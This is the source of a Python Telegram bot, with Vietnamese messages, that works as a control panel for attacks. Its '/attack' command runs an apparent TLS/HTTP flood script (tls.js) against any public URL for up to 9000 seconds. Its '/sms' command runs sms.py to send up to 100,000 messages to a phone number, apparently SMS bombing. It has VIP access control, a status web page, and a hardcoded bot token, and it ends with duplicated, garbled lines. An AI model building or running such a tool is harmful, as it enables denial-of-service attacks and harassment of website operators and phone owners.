#!/usr/bin/env python3
# bot.py — full bot (PTB v20+) with:
# /attack (run node tls.js), /kill, /status, /checkstatus, /proc, /pid,
# VIP management (/addvip /delvip /viplist), web status (Flask),
# and /sms which runs: python3 sms.py <phone> <count>
#
# SECURITY: /sms only allowed for admins/owner; count limited to SMS_MAX_COUNT.

import os
import shlex
import subprocess
import json
import threading
import asyncio
import time
import re
from urllib.parse import urlparse
from typing import Optional

from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# ===== CONFIG =====
BOT_TOKEN ="8404591037:AAFn-zck0anDPjaR2mcSY8fulg5-Iphdq6A"
OWNER_ID = 7105201572
ADMINS_FILE = "admins.json"

ALLOWED_FLAGS = {"--debug", "--http", "--full", "--cookie", "--query", "--winter"}
JOB_TIMEOUT_DEFAULT = 9000   # default timeout for attacks (s) = 15 minutes
MAX_OUTPUT_CHARS = 3000

# Web status (Flask)
WEB_HOST = "0.0.0.0"
WEB_PORT = 8080
WEB_TOKEN = "changeme_webtoken"  # CHANGE THIS!

# SMS settings (safety)
SMS_SCRIPT = "sms.py"          # file to run
SMS_TIMEOUT = 120              # seconds per sms run
SMS_MAX_COUNT = 100000             # max count allowed via /sms
PHONE_REGEX = re.compile(r'^\+?\d{7,15}$')  # basic phone validation

# ===== Admin persistence =====
def load_admins():
    if os.path.exists(ADMINS_FILE):
        try:
            with open(ADMINS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            ids = set(int(x) for x in data if isinstance(x, (int, str)) and str(x).isdigit())
        except Exception:
            ids = set()
    else:
        ids = set()
    ids.add(OWNER_ID)
    return ids

def save_admins(admins_set):
    try:
        with open(ADMINS_FILE, "w", encoding="utf-8") as f:
            json.dump(sorted(list(admins_set)), f, ensure_ascii=False, indent=2)
        return True
    except Exception as e:
        print("Save admins failed:", e)
        return False

ADMINS = load_admins()

# ===== Running process store =====
RUNNING_PROCS = {}
RUNNING_PROCS_LOCK = threading.Lock()
GLOBAL_LOOP = None
GLOBAL_APP = None

# ===== Utilities =====
def is_owner(user_id: int) -> bool:
    return user_id == OWNER_ID

def is_admin(user_id: int) -> bool:
    return user_id in ADMINS

def is_safe_url(u: str) -> bool:
    try:
        p = urlparse(u)
        if p.scheme not in ("http", "https"):
            return False
        host = p.hostname or ""
        if host in ("localhost", "127.0.0.1", "0.0.0.0"):
            return False
        if host.startswith(("10.", "192.168.", "172.")):
            return False
        return True
    except Exception:
        return False

def parse_attack_args(args):
    if len(args) < 2:
        return None
    method = args[0].upper()
    if method not in ("GET", "POST", "PUT", "DELETE", "HEAD"):
        return None
    url = args[1]
    if not is_safe_url(url):
        return None

    idx = 2
    numbers = []
    while idx < len(args) and len(numbers) < 3 and args[idx].isdigit():
        numbers.append(args[idx]); idx += 1

    outfile = None
    if idx < len(args) and not args[idx].startswith("--"):
        outfile = args[idx]; idx += 1

    flags = []
    timeout = JOB_TIMEOUT_DEFAULT
    while idx < len(args):
        tok = args[idx]
        if tok in ALLOWED_FLAGS:
            flags.append(tok)
        elif tok.startswith("--timeout="):
            try:
                v = int(tok.split("=",1)[1])
                timeout = v
            except:
                pass
        idx += 1

    return {"method": method, "url": url, "numbers": numbers, "outfile": outfile, "flags": flags, "timeout": timeout}

# ===== Thread helpers =====
def _thread_send_message(chat_id: int, text: str, parse_mode=None):
    if GLOBAL_LOOP is None or GLOBAL_APP is None:
        return
    coro = GLOBAL_APP.bot.send_message(chat_id=chat_id, text=text, parse_mode=parse_mode)
    asyncio.run_coroutine_threadsafe(coro, GLOBAL_LOOP)

def _thread_send_document(chat_id: int, file_path: str):
    if GLOBAL_LOOP is None or GLOBAL_APP is None:
        return
    async def _send():
        try:
            await GLOBAL_APP.bot.send_document(chat_id=chat_id, document=open(file_path,"rb"))
        except Exception as e:
            await GLOBAL_APP.bot.send_message(chat_id=chat_id, text=f"⚠️ Không thể gửi file {file_path}: {e}")
    asyncio.run_coroutine_threadsafe(_send(), GLOBAL_LOOP)

def _proc_wait_thread(user_id: int, chat_id: int, proc: subprocess.Popen, cmd_list: list, outfile: Optional[str], timeout: Optional[int]):
    start = time.time()
    try:
        if timeout == 0:
            stdout, stderr = proc.communicate()
            returncode = proc.returncode
            timed_out = False
        else:
            try:
                stdout, stderr = proc.communicate(timeout=timeout)
                returncode = proc.returncode
                timed_out = False
            except subprocess.TimeoutExpired:
                try:
                    proc.kill()
                except Exception:
                    pass
                try:
                    stdout, stderr = proc.communicate(timeout=5)
                except Exception:
                    stdout, stderr = ("", "")
                returncode = proc.returncode if proc.returncode is not None else -1
                timed_out = True
    except Exception as e:
        stdout, stderr = ("", f"Exception in thread: {e}")
        returncode = -1
        timed_out = False

    duration = int(time.time() - start)
    if timed_out:
        text = f"⏰ Timeout sau {timeout}s — tiến trình đã bị dừng.\nCommand: `{' '.join(shlex.quote(x) for x in cmd_list)}`"
    else:
        text = f"✅ Hoàn tất (exit {returncode})  (elapsed {duration}s)\nCommand: `{' '.join(shlex.quote(x) for x in cmd_list)}`"
    if stdout:
        txt = stdout if isinstance(stdout, str) else str(stdout)
        text += "\n\nstdout:\n" + txt[:MAX_OUTPUT_CHARS]
    if stderr:
        ter = stderr if isinstance(stderr, str) else str(stderr)
        text += "\n\nstderr:\n" + ter[:MAX_OUTPUT_CHARS]
    if len(text) > 4000:
        text = text[:3900] + "\n...[truncated]"

    _thread_send_message(chat_id, text, parse_mode="Markdown")

    if outfile:
        if os.path.exists(outfile) and os.path.isfile(outfile):
            _thread_send_document(chat_id, outfile)
        else:
            _thread_send_message(chat_id, f"ℹ️ Không tìm thấy file outfile: {outfile}")

    with RUNNING_PROCS_LOCK:
        entry = RUNNING_PROCS.get(user_id)
        if entry and entry.get("proc") is proc:
            RUNNING_PROCS.pop(user_id, None)

# ===== Handlers =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Bot sẵn sàng.\nOwner: /addvip /delvip /viplist\nUse /attack to run tls.js\nUse /sms to run dec.py (admins only).\nDefault attack timeout = {}s.".format(JOB_TIMEOUT_DEFAULT)
    )

# VIP management
async def addvip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caller = update.effective_user.id
    if not is_owner(caller):
        await update.message.reply_text("❌ Chỉ owner mới có quyền thêm VIP.")
        return
    if update.message.reply_to_message and update.message.reply_to_message.from_user:
        target_id = update.message.reply_to_message.from_user.id
    else:
        args = context.args
        if not args:
            await update.message.reply_text("Cú pháp: /addvip <user_id> (hoặc reply).")
            return
        try:
            target_id = int(args[0])
        except:
            await update.message.reply_text("ID không hợp lệ.")
            return
    if target_id in ADMINS:
        await update.message.reply_text(f"{target_id} đã là VIP.")
        return
    ADMINS.add(target_id)
    ok = save_admins(ADMINS)
    await update.message.reply_text(f"✅ Đã thêm VIP: {target_id}" if ok else "⚠️ Đã thêm nhưng không lưu được.")

async def delvip(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caller = update.effective_user.id
    if not is_owner(caller):
        await update.message.reply_text("❌ Chỉ owner mới xóa VIP.")
        return
    if update.message.reply_to_message and update.message.reply_to_message.from_user:
        target_id = update.message.reply_to_message.from_user.id
    else:
        args = context.args
        if not args:
            await update.message.reply_text("Cú pháp: /delvip <user_id> (hoặc reply).")
            return
        try:
            target_id = int(args[0])
        except:
            await update.message.reply_text("ID không hợp lệ.")
            return
    if target_id == OWNER_ID:
        await update.message.reply_text("❌ Không thể xóa owner.")
        return
    if target_id not in ADMINS:
        await update.message.reply_text("User không phải VIP.")
        return
    ADMINS.discard(target_id)
    ok = save_admins(ADMINS)
    await update.message.reply_text(f"✅ Đã xóa VIP: {target_id}" if ok else "⚠️ Xóa nhưng không lưu được.")

async def viplist(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caller = update.effective_user.id
    if not is_admin(caller) and not is_owner(caller):
        await update.message.reply_text("❌ Chỉ admin/owner mới xem được.")
        return
    if not ADMINS:
        await update.message.reply_text("Danh sách VIP rỗng.")
        return
    await update.message.reply_text("VIPs:\n" + "\n".join(str(x) for x in sorted(ADMINS)))

# Attack
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    if not is_admin(user_id) and not is_owner(user_id):
        await update.message.reply_text("❌ Không có quyền.")
        return
    args = context.args
    if not args:
        await update.message.reply_text("Cú pháp: /attack GET <url> <n1> <n2> <n3> <outfile> [--flags] [--timeout=<s>]")
        return
    parsed = parse_attack_args(args)
    if not parsed:
        await update.message.reply_text("❌ Cú pháp/URL không hợp lệ.")
        return
    cmd = ["node", "tls.js", parsed["method"], parsed["url"]] + parsed["numbers"]
    if parsed["outfile"]:
        cmd.append(parsed["outfile"])
    cmd += parsed["flags"]
    timeout = parsed.get("timeout", JOB_TIMEOUT_DEFAULT)
    quoted = " ".join(shlex.quote(x) for x in cmd)
    await update.message.reply_text(f"🚀 Đang attack...\n`{quoted}`", parse_mode="Markdown")
    with RUNNING_PROCS_LOCK:
        if user_id in RUNNING_PROCS:
            await update.message.reply_text("Bạn đã có tiến trình đang chạy. Dùng /kill trước khi start mới.")
            return
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    except FileNotFoundError as e:
        await update.message.reply_text("❌ Lỗi: node hoặc tls.js không tìm thấy: " + str(e))
        return
    except Exception as e:
        await update.message.reply_text("❌ Lỗi khi khởi tạo tiến trình: " + str(e))
        return
    thread = threading.Thread(target=_proc_wait_thread, args=(user_id, chat_id, proc, cmd, parsed.get("outfile"), timeout), daemon=True)
    thread.start()
    with RUNNING_PROCS_LOCK:
        RUNNING_PROCS[user_id] = {"proc": proc, "thread": thread, "cmd": cmd, "start_ts": time.time(), "timeout": timeout, "outfile": parsed.get("outfile")}
    await update.message.reply_text("✅ Attack started.")

# Kill
async def kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caller = update.effective_user.id
    args = context.args
    if len(args) == 0:
        target = caller
        if not is_admin(caller) and not is_owner(caller):
            await update.message.reply_text("❌ Không có quyền.")
            return
    else:
        if args[0].lower() == "all":
            if not is_owner(caller):
                await update.message.reply_text("❌ Chỉ owner mới kill all.")
                return
            killed = []
            with RUNNING_PROCS_LOCK:
                keys = list(RUNNING_PROCS.keys())
            for uid in keys:
                with RUNNING_PROCS_LOCK:
                    entry = RUNNING_PROCS.get(uid)
                if entry:
                    try:
                        entry["proc"].kill()
                        killed.append(uid)
                    except:
                        pass
            await update.message.reply_text(f"✅ Sent kill to: {killed}")
            return
        else:
            try:
                target = int(args[0])
            except:
                await update.message.reply_text("Cú pháp: /kill hoặc /kill all hoặc /kill <user_id>")
                return
            if not is_owner(caller):
                await update.message.reply_text("❌ Chỉ owner mới kill người khác.")
                return
    with RUNNING_PROCS_LOCK:
        entry = RUNNING_PROCS.get(target)
    if not entry:
        await update.message.reply_text("❗ Không có tiến trình đang chạy cho user đó.")
        return
    try:
        entry["proc"].kill()
        await update.message.reply_text(f"🛑 Sent kill to user {target}.")
    except Exception as e:
        await update.message.reply_text("❌ Không thể kill: " + str(e))

# Status (list)
async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    with RUNNING_PROCS_LOCK:
        if not RUNNING_PROCS:
            await update.message.reply_text("Không có tiến trình nào.")
            return
        lines = []
        now = time.time()
        for uid, entry in RUNNING_PROCS.items():
            elapsed = int(now - entry.get("start_ts", now))
            pid = getattr(entry.get("proc"), "pid", None)
            timeout = entry.get("timeout")
            cmdsnippet = " ".join(shlex.quote(x) for x in (entry.get("cmd") or []))[:120]
            lines.append(f"user={uid} pid={pid} elapsed={elapsed}s timeout={timeout}s cmd={cmdsnippet}")
        txt = "Running processes:\n" + "\n".join(lines)
        if len(txt) > 4000:
            txt = txt[:3900] + "\n...[truncated]"
        await update.message.reply_text(txt)

# Checkstatus (caller)
async def checkstatus(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caller = update.effective_user.id
    with RUNNING_PROCS_LOCK:
        entry = RUNNING_PROCS.get(caller)
    if not entry:
        await update.message.reply_text("Bạn không có tiến trình đang chạy.")
        return
    proc = entry.get("proc")
    pid = getattr(proc, "pid", None)
    start_ts = entry.get("start_ts")
    elapsed = int(time.time() - start_ts) if start_ts else 0
    timeout = entry.get("timeout")
    cmd = entry.get("cmd", [])
    outfile = entry.get("outfile")
    is_running = proc.poll() is None
    txt = (f"Process detail:\npid: {pid}\nrunning: {is_running}\nelapsed: {elapsed}s\ntimeout: {timeout}s\ncmd: {' '.join(shlex.quote(x) for x in cmd)}\noutfile: {outfile}")
    await update.message.reply_text(txt)

# Proc info (owner)
async def proc_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caller = update.effective_user.id
    if not is_owner(caller):
        await update.message.reply_text("❌ Chỉ owner.")
        return
    args = context.args
    if not args:
        await update.message.reply_text("Cú pháp: /proc <user_id>")
        return
    try:
        uid = int(args[0])
    except:
        await update.message.reply_text("ID không hợp lệ.")
        return
    with RUNNING_PROCS_LOCK:
        entry = RUNNING_PROCS.get(uid)
    if not entry:
        await update.message.reply_text("No running process for user.")
        return
    proc = entry.get("proc")
    pid = getattr(proc, "pid", None)
    start_ts = entry.get("start_ts")
    elapsed = int(time.time() - start_ts) if start_ts else 0
    timeout = entry.get("timeout")
    cmd = entry.get("cmd", [])
    outfile = entry.get("outfile")
    is_running = proc.poll() is None
    txt = (f"User {uid} process:\npid: {pid}\nrunning: {is_running}\nelapsed: {elapsed}s\ntimeout: {timeout}s\ncmd: {' '.join(shlex.quote(x) for x in cmd)}\noutfile: {outfile}")
    await update.message.reply_text(txt)

# PID info (owner)
async def pid_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caller = update.effective_user.id
    if not is_owner(caller):
        await update.message.reply_text("❌ Chỉ owner.")
        return
    args = context.args
    if not args:
        await update.message.reply_text("Cú pháp: /pid <user_id>")
        return
    try:
        uid = int(args[0])
    except:
        await update.message.reply_text("ID không hợp lệ.")
        return
    with RUNNING_PROCS_LOCK:
        entry = RUNNING_PROCS.get(uid)
    if not entry:
        await update.message.reply_text("No running process for user.")
        return
    pid = getattr(entry.get("proc"), "pid", None)
    await update.message.reply_text(f"user {uid} pid: {pid}")

# HELP
async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Help:\n"
        "/attack GET <url> <n1> <n2> <n3> <outfile> [--flags] [--timeout=<s>]\n"
        "/sms <phone> <count> (admins only)\n"
        "/kill [all|<user_id>]\n"
        "/status\n"
        "/checkstatus\n"
        "/proc <user_id> (owner)\n"
        "/pid <user_id> (owner)\n"
        "/addvip /delvip /viplist"
    )

# ===== SMS handler =====
async def sms_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caller = update.effective_user.id
    if not is_admin(caller) and not is_owner(caller):
        await update.message.reply_text("❌ Bạn không có quyền dùng /sms.")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Cú pháp: /sms <phone> <count>")
        return
    phone = args[0].strip()
    count_s = args[1].strip()
    # validate phone
    if not PHONE_REGEX.match(phone):
        await update.message.reply_text("Số điện thoại không hợp lệ. Dùng dạng +84901234567 hoặc 0901234567")
        return
    try:
        count = int(count_s)
    except:
        await update.message.reply_text("Count phải là số nguyên.")
        return
    if count < 1:
        await update.message.reply_text("Count phải >= 1.")
        return
    if count > SMS_MAX_COUNT:
        await update.message.reply_text(f"Count quá lớn. Tối đa = {SMS_MAX_COUNT}.")
        return

    # ensure dec.py exists
    if not os.path.exists(SMS_SCRIPT):
        await update.message.reply_text(f"❌ Không tìm thấy {SMS_SCRIPT} trong thư mục bot.")
        return

    cmd = ["python", SMS_SCRIPT, phone, str(count)]
    quoted = " ".join(shlex.quote(x) for x in cmd)
    await update.message.reply_text(f"📨 Chạy sms.py: `{quoted}`", parse_mode="Markdown")

    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=SMS_TIMEOUT)
        stdout = proc.stdout.strip()
        stderr = proc.stderr.strip()
        reply = f"✅ dec.py exit {proc.returncode}\n"
        if stdout:
            reply += "\nstdout:\n" + stdout[:2000]
        if stderr:
            reply += "\nstderr:\n" + stderr[:1000]
        if len(reply) > 4000:
            reply = reply[:3900] + "\n...[truncated]"
        await update.message.reply_text(reply)
    except subprocess.TimeoutExpired:
        await update.message.reply_text(f"⏰ dec.py timeout sau {SMS_TIMEOUT}s — đã dừng.")
    except Exception as e:
        await update.message.reply_text("❌ Lỗi khi chạy dec.py: " + str(e))

# ===== Simple Flask web status =====
def start_web_server(host=WEB_HOST, port=WEB_PORT):
    try:
        from flask import Flask, jsonify, request, render_template_string
    except Exception:
        print("Flask not installed. Run: pip install Flask")
        return

    app = Flask("bot_status")
    HTML_TEMPLATE = """
    <!doctype html>
    <html>
      <head><meta charset="utf-8"><title>Bot status</title></head>
      <body>
        <h2>Running processes ({{count}})</h2>
        <table border="1" cellpadding="6" cellspacing="0">
          <tr><th>user</th><th>pid</th><th>elapsed(s)</th><th>timeout(s)</th><th>cmd</th><th>outfile</th></tr>
          {% for r in rows %}
          <tr>
            <td>{{r.user}}</td>
            <td>{{r.pid}}</td>
            <td>{{r.elapsed}}</td>
            <td>{{r.timeout}}</td>
            <td><code>{{r.cmd}}</code></td>
            <td>{{r.outfile}}</td>
          </tr>
          {% endfor %}
        </table>
        <p>Kill via web (owner): GET /kill?token=TOKEN&uid=USER_ID</p>
      </body>
    </html>
    """

    @app.route("/")
    def index():
        rows = []
        now = time.time()
        with RUNNING_PROCS_LOCK:
            for uid, entry in RUNNING_PROCS.items():
                proc = entry.get("proc")
                pid = getattr(proc, "pid", None)
                start_ts = entry.get("start_ts", now)
                elapsed = int(now - start_ts)
                timeout = entry.get("timeout")
                cmd = " ".join(shlex.quote(x) for x in (entry.get("cmd") or []))
                outfile = entry.get("outfile")
                rows.append({"user": uid, "pid": pid, "elapsed": elapsed, "timeout": timeout, "cmd": cmd, "outfile": outfile})
        return render_template_string(HTML_TEMPLATE, rows=rows, count=len(rows))

    @app.route("/json")
    def json_status():
        out = {}
        now = time.time()
        with RUNNING_PROCS_LOCK:
            for uid, entry in RUNNING_PROCS.items():
                proc = entry.get("proc")
                pid = getattr(proc, "pid", None)
                start_ts = entry.get("start_ts", now)
                elapsed = int(now - start_ts)
                timeout = entry.get("timeout")
                cmd = " ".join(shlex.quote(x) for x in (entry.get("cmd") or []))
                outfile = entry.get("outfile")
                running = proc.poll() is None
                out[str(uid)] = {"pid": pid, "elapsed": elapsed, "timeout": timeout, "cmd": cmd, "outfile": outfile, "running": running}
        return jsonify(out)

    def _do_kill_uid(uid):
        with RUNNING_PROCS_LOCK:
            entry = RUNNING_PROCS.get(uid)
        if not entry:
            return False, "no such running proc"
        try:
            entry["proc"].kill()
            return True, "kill sent"
        except Exception as e:
            return False, str(e)

    @app.route("/kill", methods=["GET","POST"])
    def web_kill():
        token = request.values.get("token")
        if token != WEB_TOKEN:
            return ("forbidden", 403)
        uid = request.values.get("uid")
        if not uid:
            return ("missing uid", 400)
        try:
            uid_i = int(uid)
        except:
            return ("invalid uid", 400)
        ok, msg = _do_kill_uid(uid_i)
        status_code = 200 if ok else 400
        return (json.dumps({"ok": ok, "msg": msg}), status_code)

    def _run():
        print(f"Starting web status server on http://{host}:{port}  (token required for /kill)")
        app.run(host=host, port=port, threaded=True)

    t = threading.Thread(target=_run, daemon=True)
    t.start()

# ===== Main =====
def main():
    global GLOBAL_LOOP, GLOBAL_APP
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    GLOBAL_APP = app
    GLOBAL_LOOP = asyncio.get_event_loop()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("kill", kill))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("checkstatus", checkstatus))
    app.add_handler(CommandHandler("proc", proc_info))
    app.add_handler(CommandHandler("pid", pid_info))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("addvip", addvip))
    app.add_handler(CommandHandler("delvip", delvip))
    app.add_handler(CommandHandler("viplist", viplist))
    # sms command
    app.add_handler(CommandHandler("sms", sms_cmd))

    # start web server
    start_web_server(host=WEB_HOST, port=WEB_PORT)

    print("✅ Bot running. Owner ID:", OWNER_ID, f"(default timeout = {JOB_TIMEOUT_DEFAULT}s)")
    app.run_polling()

if __name__ == "__main__":
    main()in()olling()

if __name__ == "__main__":
    main()in()